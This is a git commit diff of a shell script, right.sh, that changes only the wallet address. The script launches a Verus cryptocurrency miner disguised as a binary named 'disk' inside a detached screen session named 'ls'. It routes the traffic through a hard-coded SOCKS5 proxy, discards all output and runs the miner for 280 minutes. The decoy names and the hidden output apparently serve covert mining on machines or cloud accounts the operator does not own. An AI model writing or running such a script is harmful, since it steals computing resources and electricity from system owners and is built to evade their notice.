fe8423037f248a3afd6983bc937b08475cae7a16
mamamintapulsaa <88931521+mamamintapulsaa@users.noreply.github.com>
2021-08-14 18:39:11 +0700

    Update right.sh

--- right.sh
+++ right.sh
@@ -4,7 +4,7 @@ sudo apt install screen libjansson4 -y
 chmod +x disk
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
-WALLET=DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
+WALLET=DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr
 PROXY=socks5://192.252.209.155:14455
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-PRANKENSTAINT)
 timeout 280m ./disk -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
